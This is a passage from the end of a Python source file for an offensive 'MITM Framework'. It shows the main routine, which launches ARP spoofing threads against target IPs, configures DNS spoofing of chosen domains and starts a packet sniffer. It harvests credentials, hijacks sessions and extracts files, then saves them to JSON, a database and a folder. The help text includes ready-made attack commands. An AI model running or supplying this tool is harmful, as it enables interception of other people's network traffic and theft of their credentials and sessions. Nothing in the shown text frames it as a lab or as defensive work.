    if not config.get('enable_ml_classification', False):
        return None
    
    try:
        # Simple classification based on patterns
        if packet.haslayer(HTTPRequest):
            return 'HTTP'
        elif packet.haslayer(TCP) and packet[TCP].dport == 443:
            return 'HTTPS'
        elif packet.haslayer(DNS):
            return 'DNS'
        else:
            return 'OTHER'
    except:
        return None

def print_status():
    """Print current status"""
    print("\n" + "="*70)
    print("MITM Framework Status (Enhanced Edition)")
    print("="*70)
    print(f"Running: {is_running}")
    print(f"Interface: {interface}")
    print(f"Target IPs: {', '.join(target_ips) if target_ips else 'ALL'}")
    print(f"Gateway IP: {gateway_ip}")
    print(f"ARP Spoofing: {'Active' if arp_threads else 'Inactive'}")
    print(f"DNS Spoofing: {'Active' if config.get('enable_dns_spoof') else 'Inactive'}")
    print(f"Sniffer: {'Active' if sniffer_thread and sniffer_thread.is_alive() else 'Inactive'}")
    print(f"Web Dashboard: {'Active' if web_thread and web_thread.is_alive() else 'Inactive'}")
    print(f"\nStatistics:")
    print(f"  Packets Captured: {stats['packets_captured']}")
    print(f"  Credentials: {stats['credentials_captured']}")
    print(f"  Sessions Hijacked: {stats['sessions_hijacked']}")
    print(f"  Files Extracted: {stats['files_extracted']}")
    print(f"  DNS Queries Spoofed: {stats['dns_queries_spoofed']}")
    print(f"\nEnhanced Features:")
    print(f"  Real-time Alerts: {'Enabled' if config.get('enable_real_time_alerts') else 'Disabled'}")
    print(f"  Traffic Analysis: {'Enabled' if config.get('traffic_analysis') else 'Disabled'}")
    print(f"  Advanced SSL Intercept: {'Enabled' if config.get('advanced_ssl_intercept') else 'Disabled'}")
    if FLASK_AVAILABLE and config.get('enable_web_dashboard'):
        print(f"\n🌐 Web Dashboard: http://127.0.0.1:{config.get('web_port', 8080)}")
    print("="*70 + "\n")

def main():
    """Main function"""
    global is_running, target_ips, gateway_ip, interface, arp_threads
    
    parser = argparse.ArgumentParser(
        description='Advanced MITM Framework - Enterprise Edition',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # ARP spoof single target
  python mitm.py -i eth0 -t 192.168.1.100
  
  # Multiple targets
  python mitm.py -i eth0 -t 192.168.1.100,192.168.1.101
  
  # DNS spoof specific domains
  python mitm.py -i eth0 --dns-spoof example.com:192.168.1.10
  
  # Disable web dashboard
  python mitm.py -i eth0 -t 192.168.1.100 --no-web
        """
    )
    
    parser.add_argument('-i', '--interface', type=str, help='Network interface')
    parser.add_argument('-t', '--target', type=str, help='Target IP(s), comma-separated')
    parser.add_argument('-g', '--gateway', type=str, help='Gateway IP')
    parser.add_argument('--dns-spoof', type=str, help='DNS spoof: domain:ip (e.g., example.com:192.168.1.10)')
    parser.add_argument('--no-arp', action='store_true', help='Disable ARP spoofing')
    parser.add_argument('--no-dns', action='store_true', help='Disable DNS spoofing')
    parser.add_argument('--no-web', action='store_true', help='Disable web dashboard')
    parser.add_argument('--no-credentials', action='store_true', help='Disable credential harvesting')
    parser.add_argument('--web-port', type=int, default=8080, help='Web dashboard port')
    parser.add_argument('--log-level', type=str, choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='Logging level')
    parser.add_argument('--list-interfaces', action='store_true', help='List interfaces and exit')
    
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log_level)
    
    # Print banner
    print_banner()
    
    # Check dependencies
    if not SCAPY_AVAILABLE:
        logger.error("Scapy is required. Install with: pip install scapy")
        sys.exit(1)
    
    # List interfaces
    if args.list_interfaces:
        print("\nAvailable Network Interfaces:")
        print("-" * 60)
        interfaces = get_interfaces()
        for iface in interfaces:
            ip = get_interface_ip(iface)
            mac = get_interface_mac(iface)
            print(f"  {iface}")
            if ip:
                print(f"    IP: {ip}")
            if mac:
                print(f"    MAC: {mac}")
        sys.exit(0)
    
    # Load configuration
    load_config()
    
    # Initialize database
    init_database()
    
    # Get interface
    interface = args.interface or config.get('interface')
    if not interface:
        interfaces = get_interfaces()
        if not interfaces:
            logger.error("No network interfaces found")
            sys.exit(1)
        print("\nAvailable interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  {i+1}. {iface}")
        choice = input("\nSelect interface (number): ").strip()
        try:
            interface = interfaces[int(choice) - 1]
        except (ValueError, IndexError):
            logger.error("Invalid selection")
            sys.exit(1)
    
    # Get target IPs
    target_str = args.target or config.get('target_ips', [])
    if isinstance(target_str, str):
        target_ips = [ip.strip() for ip in target_str.split(',') if ip.strip()]
    elif isinstance(target_str, list):
        target_ips = target_str
    else:
        target_input = input("Enter target IP(s), comma-separated (or press Enter for all): ").strip()
        target_ips = [ip.strip() for ip in target_input.split(',') if ip.strip()] if target_input else []
    
    # Get gateway IP
    gateway_ip = args.gateway or config.get('gateway_ip')
    if not gateway_ip:
        gateway_ip = get_gateway_ip()
        if not gateway_ip:
            gateway_ip = input("Enter gateway IP address: ").strip()
    
    # DNS spoof configuration
    if args.dns_spoof:
        domain, ip = args.dns_spoof.split(':')
        config.setdefault('dns_spoof_domains', {})[domain] = ip
        logger.info(f"DNS spoof configured: {domain} -> {ip}")
    
    # Update config
    config['interface'] = interface
    config['target_ips'] = target_ips
    config['gateway_ip'] = gateway_ip
    config['enable_arp_spoof'] = not args.no_arp
    config['enable_dns_spoof'] = not args.no_dns
    config['enable_credential_harvest'] = not args.no_credentials
    config['enable_web_dashboard'] = not args.no_web
    config['web_port'] = args.web_port
    save_config()
    
    # Get interface info
    interface_ip = get_interface_ip(interface)
    interface_mac = get_interface_mac(interface)
    
    logger.info(f"Interface: {interface} ({interface_ip}/{interface_mac})")
    logger.info(f"Target IPs: {', '.join(target_ips) if target_ips else 'ALL'}")
    logger.info(f"Gateway IP: {gateway_ip}")
    
    # Start ARP spoofing for each target
    if config.get('enable_arp_spoof', True) and target_ips and gateway_ip:
        for target_ip in target_ips:
            arp_thread = threading.Thread(
                target=arp_spoof,
                args=(target_ip, gateway_ip, interface),
                daemon=True
            )
            arp_thread.start()
            arp_threads.append(arp_thread)
        logger.info(f"ARP spoofing started for {len(target_ips)} target(s)")
        time.sleep(2)
    
    # Start packet sniffer
    start_sniffer(interface, target_ips)
    
    # Start web dashboard
    if config.get('enable_web_dashboard', True):
        start_web_dashboard()
    
    # Print status
    print_status()
    
    # Performance monitoring
    last_perf_check = time.time()
    
    try:
        while is_running:
            time.sleep(1)
            
            # Periodic status updates
            if int(time.time()) % 30 == 0:
                print_status()
            
            # Performance check every 5 minutes
            if time.time() - last_perf_check > 300:
                try:
                    if PSUTIL_AVAILABLE:
                        import psutil
                        process = psutil.Process()
                        cpu = process.cpu_percent(interval=1)
                        mem = process.memory_info().rss / 1024 / 1024
                        logger.debug(f"Performance: CPU {cpu}%, Memory {mem:.1f}MB")
                except:
                    pass
                last_perf_check = time.time()
            
            # Check alerts
            check_alerts()
            
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        is_running = False
        
        # Restore network
        if target_ips and gateway_ip:
            restore_network(target_ips, gateway_ip, interface)
        
        # Save final data
        save_credentials()
        if db_conn:
            db_conn.commit()
            db_conn.close()
        
        # Export data if enabled
        if config.get('enable_export', True):
            export_format = config.get('export_format', 'json')
            export_file = export_data(export_format)
            if export_file:
                print(f"   Export: {export_file}")
        
        # Print final status
        print_status()
        print(f"\n✅ Data saved:")
        print(f"   Credentials: {config.get('credentials_file', 'captured_credentials.json')}")
        print(f"   Database: {config.get('db_file', 'mitm_database.db')}")
        print(f"   Files: extracted_files/")
        print("Goodbye!")

if __name__ == '__main__':
    main()
